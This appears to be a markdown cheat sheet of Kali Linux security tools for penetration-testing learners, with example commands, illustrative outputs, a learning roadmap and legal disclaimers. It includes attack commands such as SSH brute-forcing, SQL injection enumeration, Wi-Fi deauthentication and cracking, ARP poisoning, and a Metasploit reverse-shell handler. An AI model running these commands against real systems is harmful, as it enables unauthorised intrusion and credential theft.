# 🛡️ Kali Linux / Linux / Networking / Cybersecurity Tools Reference

> ⚠️ **Legal Disclaimer**: All tools must be used **only on systems you own or have explicit written permission to test**. Unauthorized access is a criminal offence under the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and equivalent laws worldwide.

---

## 📋 Table of Contents

1. [Information Gathering / Reconnaissance](#1-information-gathering--reconnaissance)
2. [Network Scanning & Enumeration](#2-network-scanning--enumeration)
3. [Vulnerability Assessment](#3-vulnerability-assessment)
4. [Web Application Security](#4-web-application-security)
5. [Wireless Security / Wi-Fi Hacking](#5-wireless-security--wi-fi-hacking)
6. [Password Attacks](#6-password-attacks)
7. [Exploitation Frameworks](#7-exploitation-frameworks)
8. [Sniffing & Packet Analysis](#8-sniffing--packet-analysis)
9. [Digital Forensics](#9-digital-forensics)
10. [Reverse Engineering](#10-reverse-engineering)
11. [Linux System Monitoring & Admin](#11-linux-system-monitoring--admin)
12. [Networking Tools](#12-networking-tools)
13. [Malware Analysis](#13-malware-analysis)
14. [Containers / Cloud / DevSecOps](#14-containers--cloud--devsecops)
15. [Programming & Scripting](#15-programming--scripting)
16. [Learning Roadmap](#-learning-roadmap)

---

## 1. Information Gathering / Reconnaissance

**Used for:** Collecting target information, finding domains, IPs, emails, DNS records, and open-source intelligence (OSINT).

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Nmap** | Network mapper — port scan + OS/service detection | `nmap -sV -sC -O -p- 192.168.1.1` |
| **theHarvester** | Email, subdomain, IP OSINT from public sources | `theHarvester -d target.com -b all` |
| **Recon-ng** | Modular OSINT framework (like Metasploit for recon) | `recon-ng -w workspace` |
| **Maltego** | Visual link analysis for relationships between entities | GUI-based |
| **Amass** | In-depth DNS enumeration and subdomain discovery | `amass enum -d target.com` |
| **Sublist3r** | Fast subdomain enumeration using search engines | `sublist3r -d target.com` |
| **Shodan** | Search engine for internet-connected devices | `shodan search apache country:IN` |
| **SpiderFoot** | Automated OSINT across 200+ data sources | `spiderfoot -s target.com -t all` |
| **DNSRecon** | DNS record enumeration and zone transfers | `dnsrecon -d target.com -t axfr` |
| **Whois** | Domain registration details | `whois target.com` |
| **Netdiscover** | ARP-based host discovery on local networks | `netdiscover -r 192.168.1.0/24` |

### 💻 Snapshot: Nmap Full Scan

```bash
root@kali:~$ nmap -sV -sC -O -p- 192.168.1.1

Starting Nmap 7.94 ( https://nmap.org )
PORT     STATE  SERVICE   VERSION
22/tcp   open   ssh       OpenSSH 8.2p1 Ubuntu
80/tcp   open   http      Apache httpd 2.4.41
443/tcp  open   https     nginx 1.18.0
3306/tcp open   mysql     MySQL 5.7.33

OS Details: Linux 4.15 - 5.6
Nmap done: 1 IP scanned in 23.4 seconds
```

### 💻 Snapshot: theHarvester OSINT

```bash
root@kali:~$ theHarvester -d target.com -b all

[*] Emails found:
  admin@target.com
  john.doe@target.com
  support@target.com

[*] Hosts found:
  mail.target.com - 104.21.3.x
  dev.target.com  - 172.67.1.x

[!] Shodan results: 3 hosts exposed to internet
```

---

## 2. Network Scanning & Enumeration

**Used for:** Port scanning, service detection, SMB/SNMP enumeration, and vulnerability discovery.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Nmap** | Comprehensive port + service scanner | `nmap -sU -p 161 --script snmp-brute 10.0.0.1` |
| **Masscan** | Extremely fast internet-scale port scanner | `masscan -p1-65535 10.0.0.0/8 --rate=10000` |
| **RustScan** | Fast Rust-based scanner, pipes to Nmap | `rustscan -a 192.168.1.1 -- -sV` |
| **Unicornscan** | Async stateless TCP/UDP scanner | `unicornscan -Iv 192.168.1.1:a` |
| **Netcat** | TCP/UDP Swiss army knife | `nc -lvnp 4444` |
| **Enum4linux** | SMB/Windows enumeration | `enum4linux -a 192.168.1.1` |
| **SNMPwalk** | Query SNMP devices for information | `snmpwalk -v2c -c public 192.168.1.1` |
| **SMBclient** | Access SMB shares interactively | `smbclient //192.168.1.1/share` |
| **rpcclient** | Windows RPC enumeration | `rpcclient -U "" 192.168.1.1` |

### 💻 Snapshot: RustScan + Nmap

```bash
root@kali:~$ rustscan -a 192.168.1.1 -- -sV -sC

.----. .-. .-. .----..---. 
| {}  }| { } |{ {__ {_ _}
| .-. \| {_} |.-._} } | |
`-' `-'`-----'`----'  `-'

Open 192.168.1.1:22
Open 192.168.1.1:80
Open 192.168.1.1:8080
[~] Starting Nmap...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2
80/tcp   open  http    Apache 2.4.41
8080/tcp open  http    Tomcat 9.0.31
```

---

## 3. Vulnerability Assessment

**Used for:** Detecting weaknesses, identifying CVEs, and auditing systems for security misconfigurations.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **OpenVAS** | Open-source vulnerability scanner (Greenbone) | GUI / `gvm-cli` |
| **Nessus** | Industry-standard vulnerability assessment | GUI-based |
| **Nikto** | Web server vulnerability scanner | `nikto -h http://target.com` |
| **Lynis** | Linux system security auditing | `lynis audit system` |
| **WPScan** | WordPress-specific vulnerability scanner | `wpscan --url http://target.com --enumerate u` |
| **Nuclei** | Template-based fast vulnerability scanner | `nuclei -u https://target.com -t cves/` |
| **Retire.js** | Detect outdated JavaScript libraries | `retire --path /var/www/html` |

### 💻 Snapshot: Nikto Web Scan

```bash
root@kali:~$ nikto -h http://target.com

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /admin/: Directory indexing enabled
+ /phpMyAdmin/: phpMyAdmin detected — default credentials may work
+ X-Frame-Options header missing
+ CVE-2017-12617: Apache Tomcat RCE via PUT method possible
+ /backup.zip: Backup file found!
---------------------------------------------------------------------------
7 items found | 3 critical | Scan time: 45s
```

---

## 4. Web Application Security

**Used for:** Testing websites, finding SQLi/XSS vulnerabilities, fuzzing directories, and intercepting HTTP requests.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Burp Suite** | Full web app security testing proxy | GUI-based |
| **OWASP ZAP** | Free web application scanner | `zap-cli quick-scan http://target.com` |
| **sqlmap** | Automated SQL injection detection/exploitation | `sqlmap -u "http://site.com/id=1" --dbs` |
| **Gobuster** | Directory/file brute-forcing | `gobuster dir -u http://target.com -w common.txt` |
| **Dirb** | Web content scanner | `dirb http://target.com /usr/share/dirb/wordlists/common.txt` |
| **ffuf** | Fast web fuzzer (params, dirs, virtual hosts) | `ffuf -u http://target.com/FUZZ -w wordlist.txt` |
| **Wfuzz** | Advanced web fuzzer | `wfuzz -c -z file,wordlist.txt http://target.com/FUZZ` |
| **XSStrike** | Advanced XSS detection suite | `xsstrike -u "http://target.com/search?q=test"` |
| **Commix** | Command injection exploiter | `commix --url="http://target.com/cmd.php?cmd=id"` |
| **Hydra** | Online brute force (web forms, SSH, FTP, etc.) | `hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |

### 💻 Snapshot: sqlmap Database Dump

```bash
root@kali:~$ sqlmap -u "http://site.com/index.php?id=1" --dbs

[*] testing connection to target URL
[+] parameter 'id' is vulnerable!
    Payload Type: UNION-based (4 columns)
    Backend DBMS: MySQL >= 5.0

[*] Available databases [3]:
    [*] information_schema
    [*] users_db
    [*] admin_panel

[*] Fetched data logged to /root/.sqlmap/output/
```

### 💻 Snapshot: Gobuster Directory Brute Force

```bash
root@kali:~$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.5
===============================================================
/admin         (Status: 301) [Size: 312] [--> /admin/]
/backup        (Status: 200) [Size: 1928354]
/config.php    (Status: 200) [Size: 0]
/login         (Status: 200) [Size: 4210]
/uploads       (Status: 403) [Size: 276]
===============================================================
Progress: 4614/4614 (100%) | Time: 00:00:23
```

---

## 5. Wireless Security / Wi-Fi Hacking

**Used for:** Wi-Fi auditing, WPA/WPA2 testing, and capturing handshakes for offline cracking.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Aircrack-ng** | WPA/WEP cracking suite | `aircrack-ng -b AA:BB:CC:DD -w rockyou.txt cap.pcap` |
| **Kismet** | Wireless network detector and sniffer | `kismet -c wlan0` |
| **Reaver** | WPS PIN brute-force attack | `reaver -i wlan0mon -b AA:BB:CC:DD -vv` |
| **Wifite** | Automated Wi-Fi auditing | `wifite --wpa --dict rockyou.txt` |
| **hcxdumptool** | Capture PMKID and EAPOL packets | `hcxdumptool -i wlan0 -o capture.pcapng` |
| **Bettercap** | Advanced MITM and Wi-Fi attack framework | `bettercap -iface wlan0` |

### 💻 Snapshot: Aircrack-ng WPA2 Attack

```bash
root@kali:~$ airmon-ng start wlan0           # Enable monitor mode
root@kali:~$ airodump-ng wlan0mon            # Capture nearby APs
root@kali:~$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
root@kali:~$ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon   # Deauth
root@kali:~$ aircrack-ng -b AA:BB:CC:DD:EE:FF -w rockyou.txt cap-01.cap

[00:02:34] 148291 keys tested (1523.91 k/s)
KEY FOUND! [ mypassword2023 ]

Master Key     : AB CD EF 01 23 45 ...
Transcient Key : 12 34 56 78 9A BC ...
```

---

## 6. Password Attacks

**Used for:** Hash cracking, brute force testing, password auditing, and wordlist generation.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **John the Ripper** | CPU-based hash cracker | `john --wordlist=rockyou.txt hashes.txt` |
| **Hashcat** | GPU-accelerated hash cracking | `hashcat -m 0 hashes.txt rockyou.txt` |
| **Hydra** | Online brute force over many protocols | `hydra -l admin -P rockyou.txt ssh://192.168.1.1` |
| **Medusa** | Parallel brute force login tool | `medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh` |
| **CeWL** | Custom wordlist generator from websites | `cewl http://target.com -w wordlist.txt` |
| **Crunch** | Wordlist generator with patterns | `crunch 8 8 abc123 -o wordlist.txt` |

### 💻 Snapshot: Hashcat GPU Cracking

```bash
root@kali:~$ hashcat -m 0 hashes.txt rockyou.txt

hashcat (v6.2.6) starting...
Device #1: NVIDIA GeForce RTX 3080 - 10240MB

Speed: 12500 MH/s

5f4dcc3b5aa765d61d8327deb882cf99:password123
d8578edf8458ce06fbc5bb76a58c5ca4:qwerty
482c811da5d5b4bc6d497ffa98491e38:[ NOT FOUND ]

Session..........: hashcat
Status...........: Exhausted
Recovered........: 2/3 (66.67%) Digests
Time.Started.....: 00:01:23
```

### 💻 Snapshot: Hydra SSH Brute Force

```bash
root@kali:~$ hydra -l admin -P rockyou.txt ssh://192.168.1.1

Hydra v9.4 starting...
[DATA] 16 tasks, 1 server, 14344392 tries
[DATA] attacking ssh://192.168.1.1:22/

[22][ssh] host: 192.168.1.1   login: admin   password: letmein

1 of 1 target successfully completed, 1 valid password found
```

---

## 7. Exploitation Frameworks

**Used for:** Exploiting known vulnerabilities, generating payloads, and post-exploitation activities.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Metasploit Framework** | The most widely used exploitation framework | `msfconsole` |
| **BeEF** | Browser Exploitation Framework | `beef-xss` |
| **SearchSploit** | Offline Exploit-DB search | `searchsploit apache 2.4` |
| **Empire** | PowerShell/Python post-exploitation C2 | `powershell-empire` |
| **RouterSploit** | Router and embedded device exploitation | `rsf` |

### 💻 Snapshot: Metasploit Meterpreter Session

```bash
root@kali:~$ msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.0.1:4444
[*] Sending stage (3020772 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened!

meterpreter > sysinfo
Computer     : victim-machine
OS           : Linux 5.4.0 #1 SMP
Architecture : x64

meterpreter > getuid
Server username: www-data

meterpreter > shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 💻 Snapshot: SearchSploit

```bash
root@kali:~$ searchsploit apache 2.4.41

---------------------------------------------------
 Exploit Title                    |  Path
---------------------------------------------------
 Apache 2.4.41 - RCE              | linux/remote/48370.py
 Apache 2.4.41 - DoS              | linux/dos/48203.sh
 Apache 2.4.x - Local Privilege   | linux/local/47138.c
---------------------------------------------------

root@kali:~$ searchsploit -m linux/remote/48370.py
  Copied to: /root/48370.py
```

---

## 8. Sniffing & Packet Analysis

**Used for:** Network monitoring, packet inspection, protocol analysis, and MITM attacks.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Wireshark** | GUI packet capture and protocol analyzer | `wireshark` |
| **tcpdump** | CLI packet sniffer and filter | `tcpdump -i eth0 -n 'port 80' -A` |
| **Ettercap** | ARP poisoning and MITM suite | `ettercap -T -M arp:remote /192.168.1.1// /192.168.1.5//` |
| **dsniff** | Network credential sniffer | `dsniff -i eth0` |
| **TShark** | CLI version of Wireshark | `tshark -r capture.pcap -Y http` |

### 💻 Snapshot: tcpdump HTTP Capture

```bash
root@kali:~$ tcpdump -i eth0 -n 'port 80' -A

Capturing on eth0, link-type EN10MB
13:22:01 IP 192.168.1.5.52341 > 10.0.0.1.80: Flags [S]
GET /admin/login HTTP/1.1
Host: target.com
Cookie: auth=bearer_token_abc123xyz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)

POST /login HTTP/1.1
username=admin&password=P@ssw0rd123

HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=abc123; Path=/; HttpOnly

3 packets captured, 3 received, 0 dropped
```

---

## 9. Digital Forensics

**Used for:** Recovering digital evidence, disk analysis, memory dumps, and incident response.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Autopsy** | GUI-based digital forensics platform | GUI-based |
| **Volatility** | Memory forensics framework | `volatility -f mem.raw --profile=Win10x64 pstree` |
| **Foremost** | File carving from raw disk images | `foremost -i disk.img -o /output/` |
| **Binwalk** | Firmware analysis and extraction | `binwalk -e firmware.bin` |
| **Sleuth Kit** | Command-line forensic tools (fls, icat, etc.) | `fls -r disk.img` |

### 💻 Snapshot: Volatility Memory Analysis

```bash
root@kali:~$ volatility -f mem.raw imageinfo
Volatility Foundation Volatility Framework 2.6
Suggested Profile(s): Win10x64_19041, Win10x64_18362

root@kali:~$ volatility -f mem.raw --profile=Win10x64_19041 pstree
Name                    Pid  PPid
.System                   4     0
..smss.exe              544     4
..svchost.exe          1232   808
..explorer.exe         3120  1088
...chrome.exe          2984  3120
...malware.exe         3440  3120   ← suspicious!

root@kali:~$ volatility -f mem.raw --profile=Win10x64_19041 cmdline -p 3440
Process: malware.exe
CommandLine: C:\Users\Admin\AppData\Roaming\malware.exe --connect 185.x.x.x:4444
```

---

## 10. Reverse Engineering

**Used for:** Malware analysis, binary reversing, assembly-level code inspection.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Ghidra** | NSA-developed reverse engineering suite | GUI-based |
| **radare2** | CLI framework for binary analysis | `r2 -A ./binary` |
| **IDA Free** | Industry-standard disassembler (free version) | GUI-based |
| **strings** | Extract printable strings from binaries | `strings -n 8 malware.exe` |
| **objdump** | Disassemble ELF binaries | `objdump -d -M intel ./binary` |

### 💻 Snapshot: strings + radare2

```bash
root@kali:~$ strings -n 8 suspicious.exe | grep -E "(http|cmd|pass|key)"
http://185.x.x.x/beacon
cmd.exe /c whoami
password123
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

root@kali:~$ r2 -A suspicious.exe
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[0x00401000]> afl | head
0x00401000  fcn.entry0
0x00401080  fcn.download_payload
0x004010f0  fcn.establish_persistence
0x00401200  fcn.encrypt_files

[0x00401000]> pdf @ fcn.establish_persistence
```

---

## 11. Linux System Monitoring & Admin

**Used for:** Monitoring running processes, network connections, disk I/O, and system logs.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **htop** | Interactive process viewer | `htop` |
| **top** | Built-in process monitor | `top` |
| **iftop** | Real-time network bandwidth monitor | `iftop -i eth0` |
| **iotop** | Disk I/O monitor per process | `iotop -o` |
| **journalctl** | Query systemd journal logs | `journalctl -u ssh -n 50 -f` |
| **systemctl** | Manage systemd services | `systemctl status nginx` |
| **netstat** | Network connections and routing | `netstat -tulpn` |
| **ss** | Modern socket statistics tool | `ss -tulpn` |
| **lsof** | List open files and sockets | `lsof -i :80` |

---

## 12. Networking Tools

**Used for:** Diagnosing connectivity, DNS queries, routing, and network performance.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **ping** | ICMP host reachability test | `ping -c 4 8.8.8.8` |
| **traceroute** | Trace packet route to destination | `traceroute google.com` |
| **dig** | DNS query tool | `dig target.com ANY` |
| **nslookup** | DNS lookup utility | `nslookup -type=MX target.com` |
| **iperf** | Network bandwidth measurement | `iperf3 -c 192.168.1.1` |
| **arp** | ARP table management | `arp -a` |
| **ifconfig** | Network interface configuration (legacy) | `ifconfig eth0` |
| **ip** | Modern network interface tool | `ip addr show` |
| **route** | Routing table management | `route -n` |
| **mtr** | Combined ping + traceroute | `mtr google.com` |

---

## 13. Malware Analysis

**Used for:** Static and dynamic malware analysis, pattern matching, and sandboxed execution.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **YARA** | Pattern matching for malware classification | `yara rules.yar suspicious.exe` |
| **Cuckoo Sandbox** | Automated dynamic malware analysis | `cuckoo submit malware.exe` |
| **PEStudio** | Static PE file analysis (Windows) | GUI-based |
| **REMnux** | Linux distro for reverse-engineering malware | Full toolkit |

### 💻 Snapshot: YARA Rule Matching

```bash
root@kali:~$ cat detect_ransomware.yar
rule DetectRansomware {
    meta:
        author = "SecurityTeam"
        description = "Detects common ransomware strings"
    strings:
        $a = "YOUR FILES HAVE BEEN ENCRYPTED"
        $b = "bitcoin" nocase
        $c = ".locked" nocase
        $d = { 52 61 6E 73 6F 6D }   // "Ransom" in hex
    condition:
        2 of ($a, $b, $c, $d)
}

root@kali:~$ yara detect_ransomware.yar /suspicious/
DetectRansomware /suspicious/malware.exe   ← MATCH FOUND
```

---

## 14. Containers / Cloud / DevSecOps

**Used for:** Securing Docker/Kubernetes environments, container image scanning, and runtime monitoring.

| Tool | Description | Example Command |
|------|-------------|-----------------|
| **Docker** | Container platform | `docker ps -a` |
| **Kubernetes** | Container orchestration | `kubectl get pods --all-namespaces` |
| **Trivy** | Container and filesystem vulnerability scanner | `trivy image nginx:latest` |
| **kube-bench** | CIS Kubernetes benchmark checker | `kube-bench run --targets master` |
| **Falco** | Runtime security for containers | `falco -r rules.yaml` |

### 💻 Snapshot: Trivy Container Scan

```bash
root@kali:~$ trivy image nginx:1.21

nginx:1.21 (debian 11.3)
========================
Total: 182 (UNKNOWN: 0, LOW: 91, MEDIUM: 61, HIGH: 27, CRITICAL: 3)

CRITICAL:
┌─────────────┬────────────┬──────────┬─────────────┬────────────────────────┐
│   Library   │    CVE     │ Severity │  Installed  │         Title          │
├─────────────┼────────────┼──────────┼─────────────┼────────────────────────┤
│ openssl     │ CVE-2022-0 │ CRITICAL │ 1.1.1k-1    │ Integer overflow in BN │
│ zlib        │ CVE-2018-2 │ CRITICAL │ 1:1.2.11.d  │ Out-of-bounds pointer  │
└─────────────┴────────────┴──────────┴─────────────┴────────────────────────┘
```

---

## 15. Programming & Scripting

**Used for:** Automating attacks, writing custom exploits, building tools, and scripting repetitive tasks.

| Language | Use in Security | Getting Started |
|----------|-----------------|-----------------|
| **Python** | Exploit scripts, automation, tool development | `python3 exploit.py` |
| **Bash** | System automation, one-liners, recon scripts | `bash recon.sh target.com` |
| **Perl** | Legacy exploit code, text processing | `perl -e 'print "A"x100'` |
| **PowerShell** | Windows post-exploitation, Active Directory | `powershell -exec bypass -file payload.ps1` |
| **Git** | Version control, exploit/tool repositories | `git clone https://github.com/...` |

---

## 🗺️ Learning Roadmap

### 🟢 Beginner — Start Here

> Focus on fundamentals: Linux, networking concepts, and basic scanning.

| Order | Tool | Why Learn It First |
|-------|------|--------------------|
| 1 | **Linux Terminal** | Foundation of all security work |
| 2 | **Nmap** | Core reconnaissance skill |
| 3 | **Wireshark** | Understanding how traffic flows |
| 4 | **Burp Suite** | Web security interception |
| 5 | **Hydra** | Brute force fundamentals |
| 6 | **Gobuster** | Directory and file enumeration |
| 7 | **Netcat** | Raw TCP/UDP connectivity |
| 8 | **Metasploit Basics** | Structured exploitation |

**Resources:**
- [TryHackMe](https://tryhackme.com) — Beginner-friendly guided rooms
- [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/) — Linux fundamentals via CTF
- [Hack The Box Starting Point](https://app.hackthebox.com/starting-point)

---

### 🔵 Intermediate — Level Up

> Deepen skills in web attacks, wireless auditing, and password cracking. Start CTFs.

| Order | Tool | Skills Gained |
|-------|------|---------------|
| 1 | **sqlmap** | Automated SQL injection |
| 2 | **Aircrack-ng** | Wi-Fi security and handshake capture |
| 3 | **John the Ripper** | Offline hash cracking |
| 4 | **Hashcat** | GPU-accelerated password recovery |
| 5 | **OWASP ZAP** | Automated web vulnerability scanning |
| 6 | **Bettercap** | Network MITM and ARP poisoning |
| 7 | **tcpdump** | CLI packet analysis and filtering |

**Resources:**
- [Hack The Box](https://hackthebox.com) — Real pentest scenarios
- [VulnHub](https://vulnhub.com) — Downloadable vulnerable VMs
- [PentesterLab](https://pentesterlab.com) — Web app security focus

---

### 🟣 Advanced — Specialist Level

> Specialise in reverse engineering, forensics, or cloud security. Write custom exploits. Bug bounty.

| Order | Tool | Specialisation |
|-------|------|----------------|
| 1 | **Ghidra** | Binary reverse engineering |
| 2 | **Volatility** | Memory forensics and IR |
| 3 | **Empire** | Post-exploitation and C2 |
| 4 | **Cuckoo Sandbox** | Malware dynamic analysis |
| 5 | **Kubernetes Security** | Cloud attack surfaces |
| 6 | **Malware Analysis Stack** | YARA + PEStudio + REMnux |

**Resources:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Malware Traffic Analysis](https://malware-traffic-analysis.net/)
- [HackerOne Bug Bounty Programs](https://hackerone.com/bug-bounty-programs)
- [SANS Reading Room](https://www.sans.org/white-papers/)

---

## 📚 Certifications Roadmap

```
Entry Level:    CompTIA Security+ → CompTIA Network+
Intermediate:   CEH (Certified Ethical Hacker) → eJPT (eLearnSecurity)
Professional:   OSCP (Offensive Security) → PNPT (TCM Security)
Advanced:       OSCE3 → GREM (Malware Analysis) → GCFA (Forensics)
```

---

## ⚖️ Legal & Ethical Guidelines

1. **Always get written authorization** before testing any system.
2. **Stay within scope** — never test systems outside agreed targets.
3. **Report findings responsibly** — follow coordinated disclosure.
4. **Practice only in legal environments** — your own lab, VulnHub VMs, HTB, TryHackMe.
5. **Know your local laws** — UK Computer Misuse Act, US CFAA, IT Act 2000 (India), etc.

---

*Generated for educational purposes. Use responsibly.*
